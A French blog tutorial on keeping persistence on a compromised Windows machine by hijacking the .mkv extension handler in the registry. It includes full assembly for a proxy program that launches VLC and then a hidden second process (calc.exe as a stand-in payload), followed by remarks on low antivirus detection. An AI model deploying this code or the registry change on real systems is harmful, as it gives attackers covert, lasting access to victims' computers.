
En ces jours de confinement (covid-19), j'ai pensé qu'une méthode de persistance pouvait être d'actualité :)

Je présente alors ici, une méthode de persistance peu connue, mais que je trouve très sympa. 

Une fois un poste compromis, il peut être utile de garder un accès sur le-dit poste afin de pouvoir revenir par la suite. On parle régulièrement de **backdoor**. La **backdoor** est un programme malveillant qui permet alors de garder le controle sur une machine compromise afin d'y revenir par la suite. Le code malveillant utilisée comme backdoor ne sera pas traité ici.

Il existe de très nombreuses méthodes de persistance, je présente ici une méthode qui utilise les extensions de fichiers (.txt, .py, .mkv, .html, ...). Ainsi lorsque l'utilisateur légitime de la machine cliquera sur une icône, elle enclenchera l'exécution de la backdoor ! Je trouve ça simplement génial !

J'ai découvert cette méthode grâce à __Hasherezade__ en 2017. Et cherchant un sujet pour cet article, je me suis souvenu du POC (Proof Of Concept) que j'avais effectué à l'époque. J'en ai alors profité pour constater que cette méthode est toujours d'actualité (windows 10 1909). Pour consulter l'article d'__Hasherezad__: https://hshrzd.wordpress.com/2017/05/25/hijacking-extensions-handlers-as-a-malware-persistence-method/

La gestion des extensions est effectuée via la base de registres que l'on peut visionner grâce à __regedit.exe__. Pour voir quel programme exécute telle extension, il faut regarder dans la clef de registre:

* HKEY_USERS\S-number-...-number_Classes\.monExtension

J'ai quelques fichiers __.mkv__ qui trainent sur mon bureau, je vais donc **hijacker** l'extension __.mkv__ afin d'exécuter mon programme malveillant, mais également __VLC__ (outils qui lit par défaut mes fichiers .mkv). Ainsi l'utilisateur n'y verra que du feu.

La clef de registre qui gère l'extension __.mkv__ est présentée ci-dessous: 

![image alt text](/images/persistance/mkv.png)

On voit que le handler qui gère cette extension pointe vers __VLC.mkv__, qu'il faut alors retrouver dans la base de registres. Une rapide recherche sur le terme __VLC.mkv__ nous indique qu'elle est contenue dans:

* HKEY_CLASSES_ROOT\VLC.mkv

On le voit bien sur la capture suivante:

![image alt text](/images/persistance/mkv_not_hijacked.png)

On y voit que la valeur de la clef vaut: 

* "C:\Program Files\VideoLAN\VLC\vlc.exe" --started-from-file "%1"

L'option __--started-from-file__ est spécifique à vlc, et non à la base de registre. Concernant le __%1__, il s'agit d'une valeur propre à la base de registre qui permet de récupérer le nom du fichier sur lequel a cliqué l'utilisateur légitime de la machine compromise.

Afin de compromettre la clef de registre, il va donc falloir modifier cette valeur de manière à exécuter l'action qu'elle effectue normalement (à savoir lancer VLC avec le fichier demandé par l'utilisateur), mais qui va en plus exécuter un autre code (malveillant de surcroît).

Il va donc y avoir une sorte de proxyfication d'extension, en se sens que l'on capture le fonctionnement normal de l'exécution du programme en charge de la-dite extension. 

La nouvelle valeur de la clef de registre sera donc:

* "C:\proxy_app.exe" "C:\Program Files\VideoLAN\VLC\vlc.exe" --started-from-file "%1"

On voit sur la capture d'écran suivante le résultat:

![image alt text](/images/persistance/mkv_hijacked.png)

Ici __proxy\_app.exe__ est le programme qui me permet de **hijacker** l'extension.

On comprend donc que le fait de cliquer sur une extension __.mkv__ n'exécutera pas __vlc.exe__ comme c'était le cas auparavant, mais exécutera __proxy\_app.exe__ (qui se chargera d'exécuter __vlc.exe__, entre autre ...). 

Le programme __proxy\_app.exe__ prendra donc des arguments qui seront: 

* "C:\Program Files\VideoLAN\VLC\vlc.exe"

* --started-from-file

* "%1"

Afin de gérer les arguments passé à un programme, je vais utiliser la fonction __GetCommandLineW()__ (kernel32.dll) qui permet de récupérer les arguments passés au programme et de les stocker au format unicode (type __LPCWSTR__). J'utilise ensuite la fonction __CommandLineToArgvW()__ (Shell32.dll) qui permet de compter le nombre d'arguments. Cette routine s'effectue comme suit:

```
GetCommandLineW PROTO STDCALL
CommandLineToArgvW PROTO STDCALL :DWORD, :DWORD

.data?
     Narg   	db 256 dup (?)

.code
     call 	GetCommandLineW

     push	offset Narg
     push 	eax
     call 	CommandLineToArgvW
```

Le résultat est présenté sur la capture ci-dessous:

![image alt text](/images/persistance/getcommandline.png)

On voit que la valeur dans __eax__ (retour de la fonction __CommandLineToArgvW()__) pointe vers l'adresse contenant les arguments. Mais pas que ...

En effet, la première adresse (__007A4350__) pointe vers l'adresse (__007A4364__) qui pointe vers le  premier argument. Si l'on ajoute __4__ bytes, on passe à l'adresse suivante __007A43BC__ qui pointe vers le second argument. Si l'on ajoute encore __4__ bytes, on passe à l'adresse suivante __007A4408__ qui pointe vers le troisième argument, et ainsi de suite.

N'oublions pas que tout ces "arguments" font en réalité partie d'une seule et même ligne de commande qui permet de lancer vlc comme il faut. Ainsi, il faut récupérer ces arguments, ajouter des espaces entre chaque afin de reconstituer une ligne de commande valide. Afin de concaténer les arguments entre eux et avec des espaces, je vais utiliser la fonction __lstrcatW()__ (kernel32.dll). La routine qui effectue cela est présentée ci-dessous:

```
lstrcatW PROTO STDCALL :DWORD, :DWORD

.data
     space          db " ",0

.data?
     args_concat    db 256 dup (?)

.code
     xor 	ecx, ecx
     mov 	ecx, 1 ; to not take into account the arg 0 which is the current program name
_concatenateArgs:
     add 	eax, 4 
     lea 	ebx, [Narg]
     mov 	ebx, [ebx]
     cmp 	ecx, ebx
     je 	_createOriginalProcess

     push 	eax
     push	ecx

_concat:

    push 	[eax]
    push 	offset args_concat
    call 	lstrcatW

_add_space:
     push 	offset space
     push 	offset args_concat
     call 	lstrcatW

     pop	ecx
     pop 	eax
     inc 	ecx
     jmp 	_concatenateArgs

_createOriginalProcess:
```

La seule "difficulté" réside dans le fait que le premier argument (0) est en fait le nom de programme qui s'exécute, à savoir __proxy\_app.exe__ , il ne faut donc pas le compter (c'est pourquoi je commence avec __ecx = 1__) et surtout pas le concatener avec les autres arguments.

Une fois que les arguments qui permettent d'avoir la ligne de commande qui exécute vlc ont été concaténés, il n'y a plus qu'à utiliser la fonction __CreateProcessW()__ pour exécuter cette ligne de commande et alors ouvrir vlc comme le souhaite l'utilisateur légitime. Il ne faut pas oublier ensuite d'exécuter notre code malveillant avec la fonction __CreateProcessA()__. Le code malveillant sera ici __calc.exe__.

<details><summary><font color="red">Ici se trouve le code permettant de **hijacker**  les extensions</font></summary>
<p>
```
.586
.model flat, stdcall


; kernel32.dll
GetLastError PROTO STDCALL
ExitProcess PROTO STDCALL :DWORD
lstrcatW PROTO STDCALL :DWORD, :DWORD
GetCommandLineW PROTO STDCALL 
CreateProcessA PROTO STDCALL :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
CreateProcessW PROTO STDCALL :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD

; shell32.dll
CommandLineToArgvW PROTO STDCALL :DWORD, :DWORD

; https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
PROCESS_INFORMATION    struct 
	hProcess    	DWORD    ?
	hThread    		DWORD    ?
	dwProcessId    	DWORD    ?
	dwThreadId    	DWORD    ?
PROCESS_INFORMATION    ends

; https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
STARTUPINFOA    struct 
	cb    			DWORD    ?
	lpReserved    	DWORD    ?
	lpDesktop    	DWORD    ?
	lpTitle    		DWORD    ?
	dwX    			DWORD    ?
	dwY    			DWORD    ?
	dwXSize    		DWORD    ?
	dwYSize    		DWORD    ?
	dwXCountChars   DWORD    ?
	dwYCountChars   DWORD    ?
	dwFillAttribute DWORD    ?
	dwFlags    		DWORD    ?
	wShowWindow    	WORD    ?
	cbReserved2    	WORD    ?
	lpReserved2    	DWORD    ?
	hStdInput    	DWORD    ?
	hStdOutput    	DWORD    ?
	hStdError    	DWORD    ?
STARTUPINFOA    ends


.data
    malicious_path  db 'C:\WINDOWS\system32\calc.exe',0
    space           db " ",0
	
.data?
    startinfo       STARTUPINFOA         <>
    procinfo        PROCESS_INFORMATION <>
    args_concat     db 256 dup (?)
    Narg            db 256 dup (?)


.code

Start PROC

     call 	GetCommandLineW

     push 	offset Narg
     push 	eax
     call 	CommandLineToArgvW

     xor 	ecx, ecx
     mov 	ecx, 1 ; to not take into account the arg 0 which is the current program name
_concatenateArgs:
     add 	eax, 4 
     lea 	ebx, [Narg]
     mov 	ebx, [ebx]
     cmp 	ecx, ebx
     je 	_createOriginalProcess

     push 	eax
     push 	ecx

_concat:

     push 	[eax]
     push 	offset args_concat
     call 	lstrcatW

_add_space:
     push 	offset space
     push 	offset args_concat
     call 	lstrcatW

     pop 	ecx
     pop	eax
     inc 	ecx
     jmp 	_concatenateArgs

_createOriginalProcess:
; create first the process asked by the user
     push      offset procinfo
     push      offset startinfo 
     push      0 
     push      0
     push      8000008h ; DETACHED_PROCESS or CREATE_NO_WINDOW
     push      0
     push      0
     push      0 
     push      offset args_concat
     push      0
     call      CreateProcessW

_createMaliciousProcess:
; then create an other process mouhaha
     push      offset procinfo
     push      offset startinfo 
     push      0 
     push      0
     push      8000008h ; DETACHED_PROCESS or CREATE_NO_WINDOW
     push      0
     push      0
     push      0 
     push      0
     push      offset malicious_path
     call      CreateProcessA


_exit:
     xor     eax, eax
     push 	eax
     call 	ExitProcess

Start ENDP
END
```
</p>
</details>

Ainsi je lance d'abord l'exécution du code demandé par l'utilisateur légitime (à savoir vlc), puis l'exécution du code de l'utilisateur malveillant (à savoir calc.exe).

Cette méthode de persistence est sympa, mais nécessite de laisser 2 fichiers sur le système de fichiers de la machine infectée ... c'est moyen-moyen. Mais si le code n'est pas détecté par les antivirus, cela ne pose pas de problème, n'est-ce pas? Ci-dessous est présenté le résultat de l'analyse de  __proxy\_app.exe__ par __Virus Total__:

![image alt text](/images/persistance/vt.png)

Bon, il y a quelques detections (3/70) ... Est-ce important? Personellement, il n'y a que __Cylance__ qui me chagrine un peu.

Mais bon, si la backdoor est également quasi-indétectable, on peut être tranquille pour un moment.
